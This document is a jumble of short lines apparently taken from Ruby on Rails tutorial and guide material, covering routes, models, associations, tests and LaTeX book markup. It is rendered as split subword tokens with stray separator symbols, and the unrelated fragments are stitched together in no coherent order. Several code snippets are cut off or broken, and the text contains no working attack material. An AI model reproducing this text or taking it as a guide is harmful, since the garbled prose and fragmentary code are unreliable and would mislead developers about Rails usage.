▁If ▁you ▁want ▁to ▁be ▁more ▁specific ▁and ▁find ▁all ▁the ▁clients ▁with ▁their ▁ age ▁present ▁in ▁the ▁database ▁you ▁can ▁use ▁` Client ▖ count (: age ) ` .
▁page ▁to ▁edit ▁user ▁with ▁id ▁\ text tt {1}
▁Load ing ▁Spork ▖ pre for k ▁block ▖ ▖ .
▁User ▖ active ▖ merge ( User ▖ inactive )
▁ / signup
▁Here ▁Rails ▁know s ▁to ▁call ▁the ▁micropost ▁partial ▁because ▁each ▁element ▁of ▁\ k ode {@ feed \_ items } ▁has ▁class ▁\ k ode { Micropost } .
▁case ▁role
▁This ▁will ▁route ▁to ▁the ▁` Admin :: User Permission s ` ▁controller .
▁### ▁ Cl one ▁the ▁Rails ▁Re po s i to ry
▁[ 0, ▁true , ▁ String ] ▖ to _ param ▁# ▁=> ▁" 0 / true / String "
▁S ing ul ar ▁forms ▁are ▁alias ed ▁so ▁you ▁are ▁able ▁to ▁say :
▁The ▁User ▁model ▁itself ▁appears ▁in ▁Listing ~\ ref { code : demo _ user _ model } ; ▁a lthough ▁it ▁is ▁rather ▁plain , ▁it ▁comes ▁ equ ip ped ▁with ▁a ▁large ▁amount ▁of ▁functionality ▁because ▁of ▁inheritance ▁( Section ~\ ref { sec : inheritance _ hierarchies } ▁and ▁Section ~\ ref { sec : ruby _ classes }) .
▁This ▁same ▁information ▁can ▁be ▁store d ▁in ▁a ▁URL ▁and ▁provided ▁via ▁an ▁environment ▁variable ▁like ▁this :
▁t ▖ string ▁: image able _ type
▁\ label { table : static _ pages } }╼\ end { table }╼╼ ▁\ subsection { Test ing ▁title s ▁( R ed )} ▁% ▁( fold )╼ ▁\ label { sec : testing _ title s }╼╼
▁( This ▁uses ▁the ▁\ k ode { touch } ▁trick ▁from ▁Section ~\ ref { sec : green } ▁ en ▁route , ▁but ▁you ▁can ▁create ▁the ▁file ▁however ▁you ▁like ▖)
▁This ▁is ▁a ▁problem , ▁of ▁course , ▁because ▁the ▁code ▁in ▁Listing ~\ ref { code : branch _ raise } ▁is ▁broken .
▁Let ' s ▁run ▁the ▁test ▁suite ▁to ▁verify ▁that ▁one ▁test ▁fails :
▁| ▁app / views / comments / ▁| ▁View s ▁of ▁the ▁controller ▁are ▁store d ▁here ▁|
▁To ▁get ▁our ▁application ▁to ▁display ▁a ▁custom ▁Gravatar , ▁we ' ll ▁use ▁\ k ode { update \_ attributes } ▁( Section ~\ ref { sec : updating _ user _ objects }) ▁to ▁change ▁the ▁user ' s ▁email ▁to ▁something ▁I ▁control :
▁The ▁\ k ode { Microposts Controller } ▁class , ▁highlight ing ▁inheritance .
▁The ▁index ▁action ▁of ▁your ╼ controller ▁look s ▁like ▁this :
▁For ╼ example
▁To ▁implement ▁the ▁ forwarding ▁behavior ▁show n ▁in ▁Figure ~\ ref { fig : signin _ page _ protected _ mockup _ bootstrap }, ▁we ' ll ▁use ▁a ▁\ emph { before ▁filter } ▁in ▁the ▁Users ▁controller .
▁invoke ▁resource _ route
▁D ebug ▁mode ▁can ▁also ▁be ▁enabled ▁in ▁Rails ▁helper ▁methods :
▁* ▁C api t al ize s ▁the ▁first ▁word .
▁We ' ll ▁then ▁create ▁our ▁first ▁Rails ▁application , ▁called ▁\ k ode { hello \_ app } .
▁If ▁you ▁are ▁ serv ing ▁assets ▁directly ▁from ▁your ▁Rails ▁server ▁in ▁production , ▁the ╼ b est ▁practice ▁is ▁to ▁use ▁a ▁CDN ▁in ▁front ▁of ▁your ▁application .
▁This ▁gives ▁us ▁ sufficient ▁flexibility ▁to ▁change ▁the ▁random ▁string ▁if ▁we ▁ever ▁need ▁to .
▁It ' s ▁also ▁worth ▁noting ▁that ▁the ▁default ▁Rails ▁layout ▁includes ▁sever al ▁ additional ▁lines :
▁As ▁we ▁have ▁already ▁seen , ▁this ▁calls ╼ the ▁` show ` ▁action ▁of ▁the ▁` Article sController ` ▁which ▁in ▁turn ▁render s ▁the ╼` show ▖ html ▖ erb ` ▁template ▖
▁Testing ▁the ▁user / relationships ▁\ k ode { belongs \_ to } ▁association .
▁So ▁a ▁join ▁between ▁customer ▁and ▁order ▁models ▁will ▁give ▁the ▁default ▁join ▁table ▁name ▁of ▁" customers _ orders " ▁because ▁" c " ▁out rank s ▁" o " ▁in ▁ le x ical ▁ ordering .
▁raise ▁e ▁unless ▁e ▖ is _ missing ?
▁has _ many ▁: assemblies , ▁through : ▁: manifest s
▁Rails ▁scaffold ing ▁is ▁generated ▁by ▁passing ▁the ▁\ k ode { scaffold } ▁command ▁to ▁the ▁\ k ode { rails ▁generate } ▁ script .
▁module ▁ ActionView
▁The ▁main ▁difference ▁between ▁the ▁session ▁form ▁and ▁the ▁signup ▁form ▁is ▁that ▁we ▁have ▁no ▁ Session ▁model , ▁and ▁hence ▁no ▁an a log ue ▁for ▁the ▁\ k ode {@ user } ▁variable .
▁If ╼ the re ▁isn ' t ▁an ▁application ▁hand y ▁to ▁test ▁this ▁out ▁in , ▁generate ▁one ▁using ▁the ╼` rails ▁new ` ▁command ▁out side ▁of ▁the ▁engine ▁directory ▁like ▁this :
▁* ▁` config ▖ action _ dispatch ▖ encrypted _ signed _ cookie _ s alt ` ▁set s ▁the ▁signed ╼ encrypted ▁cookies ▁ s alt ▁value ▖
▁42 ▁files ▁changed , ▁ 8 4 6 1 ▁insert ion s ( + ), ▁0 ▁deletion s ( - )
▁d ▖ end _ of _ month ▁# ▁=> ▁Mon , ▁31 ▁May ▁2010
▁You ▁can ▁also ▁specify ▁a ▁second ▁partial ▁to ▁be ▁rendered ▁between ▁instance s ▁of ▁the ▁main ▁partial ▁by ▁using ▁the ▁`: space r _ template ` ▁option :
▁The ▁key ▁is ▁the ▁\ emph { class } ▁of ▁the ▁object --- in ▁this ▁case , ▁\ k ode { User } .
▁This ▁is ▁why ▁ having ▁\ emph { some } ▁test ▁of ▁the ▁view , ▁even ▁a ▁minimal ist ▁one , ▁is ▁so ▁important ▖)
▁$ ▁git ▁remote ▁add ▁ upstream ▁ https :// github ▖ com / rails / rails ▖ git
▁We ▁see ▁from ▁these ▁conditions ▁that ▁we ' ll ▁need ▁an ▁array ▁of ▁id s ▁corresponding ▁to ▁the ▁users ▁being ▁followed .
▁T e mp or ary ▁files
▁Like ▁all ▁other ▁validations , ▁` validates _ with ` ▁take s ▁the ▁`: if `, ▁`: unless ` ▁and ╼` : on ` ▁options ▖
▁Return s ▁a ▁hidden ▁input ▁tag ▁tailor ed ▁for ▁access ing ▁a ▁specified ▁attribute .
▁T w o ▁new ▁ s crubber s ▁have ▁also ▁been ▁added : ▁` P er m it S crubber ` ▁and ▁` T ar get S crubber ` .
▁Defaults ▁to ▁` true ` ▖ ╼╼
▁To ▁add ▁a ▁ member ▁route , ▁just ▁add ▁a ▁` member ` ▁block ▁into ▁the ▁resource ▁block :
▁module ▁Article s Helper
▁This ▁association ▁indicates ▁that ▁the ▁declar ing ▁model ▁can ▁be ▁match ed ▁with ▁ zero ▁or ▁more ▁instance s ▁of ▁another ▁model ▁by ▁proceeding ▁ _ through _ ▁a ▁third ▁model ▖
▁In clu d ing ▁the ▁specific ▁address ▁that ▁cause s ▁any ▁failure ▁is ▁es pecially ▁useful ▁in ▁a ▁test ▁with ▁an ▁\ k ode { each } ▁ lo o p ▁like ▁Listing ~\ ref { code : email _ format _ valid _ tests } ; ▁otherwise , ▁any ▁failure ▁would ▁me re ly ▁identify ▁the ▁line ▁number , ▁which ▁is ▁the ▁same ▁for ▁all ▁the ▁email ▁addresses , ▁and ▁which ▁would n ' t ▁be ▁ sufficient ▁to ▁identify ▁the ▁source ▁of ▁the ▁problem .
▁=> ▁0 ▖ ▖ 9
▁belongs _ to ▁: client
▁#### ▁ div _ for
▁| ▁| ▁4 06 ▁| ▁: not _ accept able ▁|
▁# ▁=> ▁ { ' 200 9 - 0 32 ' ▁=> ▁< Invoice ▁ ▖ ▖ .
▁You ▁can ▁also ▁remove ▁the ▁uniqueness ▁constraint :
▁As ▁noted ▁in ▁Section ~\ ref { sec : the _ flash }, ▁the ▁flash ▁HTML ▁in ▁Listing ~\ ref { code : layout _ flash } ▁is ▁ugly .
▁A ▁test ▁of ▁\ k ode { dependent : ▁: destroy } ▖
▁To ▁prevent ▁conflicts ▁between ▁ Spring ▁and ▁Git ▁when ▁using ▁Guard , ▁you ▁should ▁add ▁the ▁\ k ode { spring / } ▁directory ▁to ▁the ▁\ k ode { ▖ gitignore } ▁file ▁used ▁by ▁Git ▁to ▁determine ▁what ▁to ▁ignore ▁when ▁adding ▁files ▁or ▁directories ▁to ▁the ▁repository .
▁The ▁application ▁code ▁will ▁turn ▁out ▁to ▁be ▁relative ly ▁complicated , ▁but ▁we ▁can ▁write ▁a ▁ r id ic ul ous ly ▁simple ▁test ▁for ▁ friendly ▁ forwarding ▁just ▁by ▁ r ever s ing ▁the ▁order ▁of ▁logging ▁in ▁and ▁visit ing ▁the ▁edit ▁page ▁in ▁Listing ~\ ref { code : edit _ tests _ logged _ in } .
▁The ▁default ▁value ▁is ▁the ▁upper case ▁`: type ` ▁value , ▁for ▁example , ▁" A T O M " ▁or ▁" RSS " .
▁invoke ▁resource _ route
▁In ▁Chapter ~\ ref { cha : filling _ in _ the _ layout }, ▁we ' ll ▁start ▁ putting ▁it ▁to ▁good ▁use ▁in ▁developing ▁the ▁sample ▁application .
▁Now ▁you ▁can ▁d raw ▁ uni code ▁character ▁routes ▁directly ▖
▁We ▁can ▁see ▁the ▁result ▁of ▁all ▁this ▁work ▁by ▁ signing ▁up ▁our ▁first ▁user ▁under ▁the ▁name ▁`` Rails ▁Tutorial '' ▁and ▁email ▁address ▁`` example @ railstutorial ▖ org '' ▁( Figure ~\ ref { fig : first _ signup }) .
▁Note ▁that ▁we ' ve ▁taken ▁the ▁opportunit y ▁to ▁use ▁a ▁method ▁reference ▁for ▁email ▁downcas ing ▁as ▁well .
▁admin ▖ validates ▁: password , ▁length : ▁ { ▁ minimum : ▁10 ▁ }
▁The ▁next ▁request ▁to ▁the ╼ CDN ▁that ▁comes ▁in ▁to ▁the ▁same ▁URL ▁will ▁hit ▁the ▁cached ▁copy ▖
▁With ▁the ▁form ▁and ▁its ▁ associated ▁route ▁defined , ▁you ▁will ▁be ▁able ▁to ▁fill ▁in ▁the ╼ form ▁and ▁then ▁click ▁the ▁submit ▁button ▁to ▁ begin ▁the ▁process ▁of ▁creating ▁a ▁new ╼ article , ▁so ▁go ▁a head ▁and ▁do ▁that ▖
▁* ▁` Rack :: MethodOverride ` ▁allows ▁the ▁method ▁to ▁be ▁overrid d en ▁if ▁` params [: _ method ]` ▁is ▁set ▖
▁Fin ally , ▁for ▁convenience ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁a do p t s ▁two ▁convention s ▁design ed ▁to ▁make ▁the ▁many ▁code ▁sample s ▁easier ▁to ▁understand .
▁On ce ▁the ▁block ▁is ▁done ▁` atomic _ write ` ▁close s ▁the ▁file ▁handle ▁and ▁complete s ▁its ▁job .
▁In ▁Rails , ▁the ▁default ▁data ▁structure ▁for ▁a ▁data ▁model ▁is ▁called , ▁natural ly ▁enough , ▁a ~\ emph { model } ▁( the ▁M ▁in ▁ MVC ▁from ▁Section ~\ ref { sec : mvc }) .
▁Your ▁exact ▁results ▁will ▁differ ▁in ▁these ▁details , ▁but ▁otherwise ▁should ▁ essentially ▁match ▁the ▁output ▁show n ▁above .
▁I ▁ ur ge ▁you ▁not ▁to ▁look ▁too ▁close ly ▁at ▁the ▁generated ▁code ; ▁at ▁this ▁stage , ▁it ▁will ▁only ▁serve ▁to ▁con f use ▁you .
▁As ▁seen ▁in ▁Listing ~\ ref { code : name _ presence _ test }, ▁all ▁we ▁need ▁to ▁do ▁is ▁set ▁the ▁\ k ode {@ user } ▁variable ' s ▁\ k ode { name } ▁attribute ▁to ▁a ▁blank ▁string ▁( in ▁this ▁case , ▁a ▁string ▁of ▁spaces ) ▁and ▁then ▁check ▁( using ▁the ▁\ k ode { assert \_ not } ▁method ) ▁that ▁the ▁result ing ▁User ▁object ▁is ▁not ▁valid .
▁ weeks _ ago
▁The ▁same ▁thing ▁go es ▁if ▁you ▁want ▁to ▁use ▁a ▁standard ▁initializer .
▁C ▖ descendants ▁# ▁=> ▁[]
▁# ▁app / controllers / users _ controller ▖ rb
▁### ▁In spec ting ▁ Middleware ▁ Stack
▁ Adding ▁a ▁status ▁feed ▁to ▁the ▁Home ▁page .
▁url _ field _ tag ▁' url '
▁The ▁result ▁appears ▁in ▁Figure ~\ ref { fig : sqlite _ database _ browser }) ; ▁compare ▁with ▁the ▁diagram ▁in ▁Figure ~\ ref { fig : user _ model _ initial } .
▁ SELECT ▁" articles "▖" id " ▁AS ▁t 0 _ r 0, ▁▖▖▖ ▁" comments "▖" updated _ at " ▁AS ▁t 1 _ r 5 ▁FROM ▁" articles " ▁ LE F T ▁ OUT ER ▁JOIN ▁" comments " ▁ ON ▁" comments "▖" article _ id " ▁= ▁" articles "▖" id " ▁WHERE ▁( comments ▖ visible ▁= ▁1)
▁in ▁Listing ~\ ref { code : preventing _ unactivated _ signin s } .
▁The ▁` collection << ` ▁method ▁add s ▁one ▁or ▁more ▁objects ▁to ▁the ▁collection ▁by ▁setting ▁their ▁foreign ▁keys ▁to ▁the ▁primary ▁key ▁of ▁the ▁calling ▁model .
▁The ▁HTML ▁structure ▁of ▁a ▁typical ▁web ▁page .
▁╼╼\ end { aside }╼╼\ section { In tr o duction } ▁% ▁( fold )╼\ label { sec : in tr o duction }╼╼
▁$ ▁ cd ▁action mailer
▁If ▁the ▁user ▁is ▁ authenticated , ▁change ▁the ▁status ▁from ▁`` unactivated '' ▁to ▁`` activated '' .
▁It ▁provides ▁a ▁more ▁obvious ▁ alternative ▁to ▁calling ▁` render ▁: not h ing ` ▖
▁Date ▖ new (201 0, ▁4 , ▁30 )▖ months _ ago (2) ▁# ▁=> ▁Sun , ▁28 ▁Feb ▁2010
▁Now ▁the ▁test ▁suite ▁for ▁users ▁with ▁invalid ▁information ▁should ▁be ▁green :
▁In ▁this ▁case , ▁it ' s ▁the ▁symbol ▁`: article ` ▖
▁HTTP ▁request ▁headers ▁have ▁a ▁Re f er er , ▁User - A g ent ▁( client ▁software ), ▁and ▁ Cookie ▁field , ▁a mong ▁other s ▖
▁delete ╼ ▁user
▁create ▁app / views / users / _ form ▖ html ▖ erb
▁# ▁=> ▁< input ▁id =" url " ▁name =" url " ▁type =" url " ▁/>
▁App ly ing ▁the ▁results ▁of ▁the ▁above ▁discussion ▁yields ▁the ▁succinct ▁\ k ode { current \_ user } ▁method ▁show n ▁in ▁Listing ~\ ref { code : current _ user } .
▁To ▁distinguish ▁between ▁these ▁two ▁cases , ▁we ' ll ▁a do p t ▁the ▁terminology ▁of ▁\ emph { active } ▁and ▁\ emph { passive } ▁relationships : ▁if ▁ Calvin ▁is ▁following ▁ Hobbes ▁but ▁not ▁ v ice ▁ v ers a , ▁ Calvin ▁has ▁an ▁active ▁relationship ▁with ▁ Hobbes ▁and ▁ Hobbes ▁has ▁a ▁ passive ▁relationship ▁with ▁ Calvin
▁ ╼\ end { enumerate }╼╼ ▁% ▁subsection ▁login _ upon _ signup ▁( end )╼╼ ▁% ▁section ▁login _ success ▁( end )╼╼ ▁\ section { Log g ing ▁out } ▁% ▁( fold )╼ ▁\ label { sec : logging _ out }╼╼
▁* ▁How ▁to ▁automatically ▁create ▁paths ▁and ▁URLs ▁using ▁route ▁helpers .
▁For ▁more ▁details ▁on ▁the ▁kind ▁of ▁callbacks ▁supported ▁by ▁Active ▁Record , ▁see ▁the ▁\ href { http :// guides ▖ rubyonrails ▖ org / v 3 ▖ 2▖1 3 / active _ record _ validations _ callback s ▖ html } { d is c us s ion ▁of ▁callbacks ▁at ▁the ▁Rails ▁Guides } .
▁<%= ▁render ▁[ customer 1, ▁ employee 1, ▁customer 2, ▁ employee 2 ] ▁%>
▁move ▁file ▁( re name )
▁following
▁<%= ▁render ▁template : ▁" layouts / application " ▁%>
▁As ▁show n ▁in ▁Figure ~\ ref { fig : cloud 9 _ new _ workspace }, ▁create ▁a ▁ workspace ▁called ▁`` rails - tutorial '' ▁(\ emph { not } ▁`` rails \_ tutorial '') , ▁set ▁it ▁to ▁`` P ri v ate ▁to ▁the ▁people ▁I ▁in v ite '' , ▁and ▁select ▁the ▁ icon ▁for ▁the ▁Rails ▁Tutorial ▁(\ emph { not } ▁the ▁ icon ▁for ▁Ruby ▁on ▁Rails )
▁$ ▁ cd ▁ workspace /
▁* ▁ Asset ▁manifest ▁files ▁( ` application ▖ js ` ▁and ▁` application ▖ css ` )
▁To ▁get ▁the ▁application ' s ▁database ▁to ▁work , ▁you ' ll ▁also ▁have ▁to ▁ migrate ▁the ▁production ▁database :
▁ RSS ▁feed
▁( The re ▁is ▁no ▁relationship ▁between ▁this ▁\ k ode { respond \_ to } ▁and ▁the ▁\ k ode { respond \_ to } ▁used ▁in ▁the ▁RSpec ▁examples ▖)
▁# ▁via ▁a ▁model
▁ nd ╼ ▁end ╼ end ╼\ end { code }╼\ end { code listing }╼╼ ▁% ▁subsection ▁scope s _ subselect s _ and _ a _ lambda ▁( end )╼╼ ▁\ section { Co nclusion } ▁% ▁( fold )╼ ▁\ label { sec : following _ co nclusion }╼╼
▁Route s ▁should ▁be ▁included ▁in ▁your ▁testing ▁strategy ▁( just ▁like ▁the ▁rest ▁of ▁your ▁application )▖
▁As ▁usual , ▁you ▁can ▁also ▁push ▁the ▁code ▁and ▁deploy ▁the ▁application ▁if ▁you ▁want :
▁</ div >
▁### ▁D eep ▁ dup li cat ing
▁NOTE : ▁The ▁` root ` ▁route ▁only ▁routes ▁` GET ` ▁requests ▁to ▁the ▁action .
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : micropost _ instance _ variable }
▁In ▁your ▁view ▁template ▁you ▁could ▁use ▁something ▁like
▁### ▁`: on `
▁[ 0, ▁1, ▁- 5 , ▁1, ▁1, ▁" foo ", ▁" bar "] ▖ split (1)
▁D id ▁you ▁know ▁that ▁\ k ode {" Michael ▁Hartl " @ example ▖ com }, ▁with ▁ quot ation ▁mark s ▁and ▁a ▁ space ▁in ▁the ▁m id d le , ▁is ▁a ▁valid ▁email ▁address ▁according ▁to ▁the ▁standard ?
▁╼╼\ subsection { What ▁we ▁ learned ▁in ▁this ▁chapter } ▁% ▁( fold )╼\ label { sec : advance d _
▁A ▁successful ▁password ▁reset .
▁@ ips ▖ include ?(
▁This ▁is ╼ mostly ▁useful ▁together ▁with ▁the ▁`: through ` ▁option .
▁First ▁make ▁sure ▁your ▁changes ▁are ▁the ▁only ▁difference ▁between ▁your ▁current ▁branch ▁and ▁master :
▁Rails ▖ application ▖ config ▖ before _ initialize ▁do
▁When ▁using ▁the ▁console , ▁type ▁ Ctrl - C ▁if ▁you ▁get ▁ st u c k , ▁or ▁ Ctrl - D ▁to ▁ ex it ▁the ▁console ▁ al to get her .
▁* ▁` app / views / layouts / application ▖ html ▖ erb `
▁There ▁are ▁sever al ▁ways ▁of ▁getting ▁similar ▁results ▁with ▁different ▁sub - t em plat ing ▁ scheme s ▁using ▁this ▁technique ▖
▁in ▁the ▁sample ▁app ▁( Listing ~\ ref { code : home _ root _ route }) .
▁### ▁Active ▁Record ▁as ▁an ▁ ORM ▁ Frame work
▁As ▁you ▁proceed ▁through ▁this ▁tutorial , ▁in ▁all ▁like li h ood ▁you ▁will ▁ o cc as ion ally ▁be ▁tri p ped ▁up ▁by ▁things ▁not ▁immediately ▁working ▁as ▁expected .
▁But ▁if ▁you ' re ▁ planning ▁to ▁submit ▁your ▁change ▁back ▁for ▁inclusion ▁in ▁Rails , ▁keep ▁a ▁few ▁things ▁in ▁mind :
▁| ▁test / fixtures / comments ▖ yml ▁| ▁ Sample ▁comments ▁for ▁use ▁in ▁testing ▁|
▁When ▁an ▁engine ▁is ▁generated , ▁there ▁is ▁a ▁small er ▁ dummy ▁application ▁created ▁inside ╼ it ▁at ▁` test / dummy ` ▖
▁As ▁you ▁know , ▁the ▁Controller ▁is ▁responsib le ▁for ▁or ch est r ating ▁the ▁whole ▁process ▁of ▁handling ▁a ▁request ▁in ▁Rails , ▁though ▁it ▁normal ly ▁hand s ▁off ▁any ▁heav y ▁code ▁to ▁the ▁Model ▖
▁$ ▁rails ▁generate ▁controller ▁StaticPages ▁ home ▁help ▁-- no - test - framework
▁then ▁the ▁route r ▁will ▁generate ▁the ▁path ▁` / patients / 17 ` ▖
▁* ▁[ R ailscasts : ▁ Turbolinks ]( http :// r ailscasts ▖ com / episodes / 3 9 0 - turbolinks )
▁Next , ▁we ▁need ▁to ▁assembl e ▁some ▁test ▁data , ▁which ▁we ▁can ▁do ▁by ▁adding ▁some ▁relationships ▁fixtures ▁to ▁create ▁following / follower ▁relationships .
▁class ▁ Admin Mailer ▁< ▁ ActionMailer :: Base
▁RESTful ▁routes ▁provided ▁by ▁the ▁ Password ▁Re set s ▁resource ▁in ▁Listing ~\ ref { code : password _ resets _ resource } .
▁Note ▁the ▁use ▁of ▁the ▁\ k ode { full \_ title } ▁helper ▁from ▁Listing ~\ ref { code : title _ helper } ▁to ▁test ▁the ▁page ' s ▁title , ▁which ▁we ▁gain ▁access ▁to ▁by ▁including ▁the ▁Application ▁ Helper ▁module ▁into ▁the ▁test
▁As ▁you ▁can ▁see , ▁after ▁ dup li cat ing ▁the ▁` Array ` ▁instance , ▁we ▁ got ▁another ▁object , ▁therefore ▁we ▁can ▁modify ▁it ▁and ▁the ▁original ▁object ▁will ▁ st a y ▁un change d ▖
▁Rails ▁3 ▖ x ▁signed , ▁but ▁did ▁not ▁encrypt , ▁the ▁contents ▁of ▁cookie - base d ▁session ▖
▁The ▁result ▁should ▁look ▁something ▁like ▁Figure ~\ ref { fig : demo _ micropost _ index } .
▁Tests ▁allow ▁code ▁to ▁be ▁\ emph { refactored } ▁( i ▖ e ▖ , ▁changing ▁its ▁form ▁without ▁changing ▁its ▁function ) ▁with ▁ greater ▁confidence .
▁In ▁this ▁section , ▁we ' ll ▁start ▁by ▁remember ing ▁user ▁login s ▁by ▁default , ▁ ex p ir ing ▁their ▁sessions ▁only ▁when ▁they ▁explicitly ▁log ▁out .
▁The ▁actual ▁HTML ▁generated ▁by ▁this ▁ ERb ▁isn ' t ▁particular ly ▁relevant , ▁but ▁you ▁m ight ▁be ▁curious , ▁so ▁here ' s ▁a ▁ pe e k ▁at ▁a ▁schematic ▁view ▁( de tail s ▁may ▁differ ) :
▁See ▁Section ~\ ref { sec : sample _ app _ setup } ▁for ▁more ▁information .
▁has _ and _ belongs _ to _ many ▁: assemblies ,
▁Having ▁defined ▁a ▁basic ▁user ▁page ▁in ▁the ▁previous ▁section , ▁we ' ll ▁now ▁f le sh ▁it ▁out ▁a ▁little ▁with ▁a ▁profile ▁image ▁for ▁each ▁user ▁and ▁the ▁first ▁ cut ▁of ▁the ▁user ▁ sidebar .
▁A ▁ detailed ▁diagram ▁of ▁ MVC ▁in ▁Rails .
▁App ly ing ▁this ▁idea ▁to ▁all ▁three ▁static ▁pages ▁gives ▁the ▁tests ▁show n ▁in ▁Listing ~\ ref { code : title _ tests } .
▁def ▁set _ delivery _ options
▁#### ▁` underscore `
▁match ▁start ▁of ▁a ▁string
▁The ▁inheritance ▁structure ▁for ▁controllers ▁is ▁only ▁slightly ▁more ▁complicated .
▁` assert _ recognizes ` ▁is ▁the ▁ inverse ▁of ▁` assert _ generate s ` ▖
▁The ▁result ▁is ▁the ▁user ▁\ href { http :// localhost :3000/ users /1 }{\ text tt { show } } ▁page , ▁as ▁seen ▁in ▁Figure ~\ ref { fig : demo _ show _ user _ rails _3} .
▁I ▁also ▁ha d ▁to ▁install ▁a ▁\ href { https :// en ▖ w ikipedia ▖ org / wiki / YAML } { YAML } ▁library :
▁in ▁Listing ~\ ref { code : user _ show _ page _ test } .
▁collect ▁ { ▁| e | ▁e ▖ to _ param ▁ } ▖ join ▁' / '
▁Now ▁that ▁we ' ve ▁updated ▁the ▁\ k ode { README }, ▁we ▁can ▁push ▁the ▁changes ▁up ▁to ▁GitHub ▁to ▁see ▁the ▁result .
▁The ▁ regex ▁matches ▁the ▁text ▁of ▁the ▁line ▁in ▁the ▁scenario , ▁and ▁the ▁contents ▁of ▁the ▁block ▁are ▁the ▁Ruby ▁code ▁needed ▁to ▁implement ▁the ▁step .
▁Client ▖ order ( orders _ count : ▁: as c , ▁created _ at : ▁: desc )
▁In ▁the ▁previous ▁example ▁it ▁could ▁be ▁the ▁case ▁that ▁`: log _ level ` ▁does ▁not ▁be long ▁to ▁the ▁public ▁interface ▁of ▁the ▁library ▁and ▁it ▁is ▁only ▁used ▁for ▁development ▖
▁As ▁with ▁\ k ode { paginate }, ▁we ▁can ▁use ▁the ▁\ k ode { count } ▁method ▁through ▁the ▁association .
▁# ▁H and le ▁a ▁successful ▁save .
▁When ▁you ▁pass ▁a ▁collection ▁to ▁a ▁partial ▁via ▁the ▁`: collection ` ▁option , ▁the ▁partial ▁will ▁be ▁inserted ▁once ▁for ▁each ▁ member ▁in ▁the ▁collection :
▁#### ▁Rendering ▁raw ▁ body
▁If ▁you ▁were ▁to ▁leave ▁off ▁the ▁` main _ app ` ▁" routing ▁ proxy " ╼ method ▁call , ▁it ▁could ▁ potentially ▁go ▁to ▁the ▁engine ' s ▁or ▁application ' s ▁root ,╼ de pending ▁on ▁where ▁it ▁was ▁called ▁from .
▁The ▁signin ▁form ▁after ▁try ing ▁to ▁access ▁a ▁ protected ▁page ▖ ~\ href { http :// railstutorial ▖ org / images / figures / protected _ sign _ in _ bootstrap - full ▖ png }{( full ▁size )}
▁The ▁main ▁difference ▁between ▁this ▁and ▁the ▁signin ▁form ▁is ▁that ▁we ▁have ▁no ▁ Session ▁model , ▁and ▁hence ▁no ▁an a log ue ▁for ▁the ▁\ k ode {@ user } ▁variable .
▁The ▁user ▁show ▁page ▁with ▁a ▁custom ▁Gravatar .
▁* ▁` assert _ recognizes `
▁R o ll ▁your ▁own ▁authentication ▁system
▁<%= ▁image _ tag ▁" home ▖ g if " ▁%>
▁ )╼╼ \ subsection { What ▁we ▁ learned ▁in ▁this ▁chapter } ▁% ▁( fold )╼\ label { sec : filling _ in _ the _ layout _ what _ we _ learned _ in _ this _ chapter }╼╼\ begin { item ize }╼╼\ item
▁* ▁`: primary _ key `
▁te }╼╼ ▁% ▁subsection ▁the _ finished _ signup _ form ▁( end )╼╼ ▁\ subsection { The ▁flash } ▁% ▁( fold )╼ ▁\ label { sec : the _ flash }╼╼
▁The ▁corresponding ▁web ▁page ▁appears ▁in ▁Figure ~\ ref { fig : home _ view _ full _ html }
▁( Here ▁I ' ve ▁also ▁added ▁the ▁optional ▁ RVM ▁gem set ▁line ▁for ▁convenience .
▁Use ▁the ▁article ▁" an " ▁for ▁" SQL ", ▁as ▁in ▁" an ▁SQL ▁statement "▖
▁We ' ll ▁start ▁by ▁adding ▁a ▁delete ▁link ▁for ▁each ▁user ▁on ▁the ▁user ▁index ▁page , ▁restrict ing ▁access ▁to ▁ administrative ▁users .
▁The ▁important ▁point ▁is ▁that ▁\ emph { you ▁do ▁not ▁need ▁to ▁understand ▁RSpec ' s ▁syntax ▁to ▁be ▁able ▁to ▁use ▁RSpec } ▖ ▁It ▁may ▁seem ▁like ▁magic ▁at ▁first , ▁but ▁RSpec ▁and ▁Capybara ▁are ▁design ed ▁to ▁read ▁more ▁or ▁less ▁like ▁English , ▁and ▁if ▁you ▁follow ▁the ▁examples ▁in ▁this ▁tutorial ▁you ' ll ▁ pick ▁it ▁up ▁fai r ly ▁quickly .
▁Now ▁that ▁we ' ve ▁put ▁our ▁project ▁under ▁version ▁control ▁with ▁Git , ▁it ' s ▁time ▁to ▁push ▁our ▁code ▁up ▁to ▁\ href { http :// www ▖ bitbucket ▖ com } { Bitbucket }, ▁a ▁site ▁optimized ▁for ▁host ing ▁and ▁ sh ar ing ▁Git ▁repositories .
▁render ▁" edit ▖ html ▖ erb "
▁In ▁Section ~\ ref { sec : cha n g ing _ the _ layout _ links }, ▁we ' ll ▁change ▁the ▁links ▁on ▁the ▁application ▁layout , ▁including ▁a ▁URL ▁to ▁the ▁current ▁user ' s ▁profile .
▁Even ▁for ▁experience d ▁Rails ▁developers , ▁ installing ▁Ruby , ▁Rails , ▁and ▁all ▁the ▁ associated ▁support ing ▁software ▁can ▁be ▁an ▁exercise ▁in ▁f ru str ation .
▁$ ▁rake ▁ blorgh : install : migrations
▁ ╼ ▁is ▁the ▁sample ▁application ▁for ▁the ▁tutorial .
▁ ), ▁the
▁#### ▁ Response ▁S p li tt ing
▁pa y ment _ type ▁== ▁" card "
▁### ▁Change s ▁in ▁JSON ▁handling
▁< html >
▁If ▁you ' d ▁like ▁to ▁refactor ▁other ▁tests ▁to ▁use ▁\ k ode { full \_ title } ▁( such ▁as ▁those ▁in ▁Listing ~\ ref { code : base _ title _ test }), ▁you ▁should ▁include ▁the ▁Application ▁ Helper ▁in ▁\ k ode { test \_ helper ▖ rb } ▁instead .
▁resources ▁: publish ers ▁do
▁The ▁result ▁would ▁be ▁that , ▁by ▁passing ▁in ▁the ▁entire ▁\ k ode { params } ▁hash ▁to ▁\ k ode { User ▖ new }, ▁we ▁would ▁allow ▁any ▁user ▁of ▁the ▁site ▁to ▁gain ▁ administrative ▁access ▁by ▁including ▁\ k ode { admin =' 1 ' } ▁in ▁the ▁web ▁request .
▁ Most ▁editor s ▁that ▁do ▁not ▁already ▁default ▁to ▁ UT F -8 ▁( such ▁as ╼ ▁some ▁versions ▁of ▁D re a m we a ve r ) ▁offer ▁a ▁way ▁to ▁change ▁the ▁default ▁to ▁ UT F -8 ▖
▁A ▁helper ▁to ▁wrap ▁long ▁words .
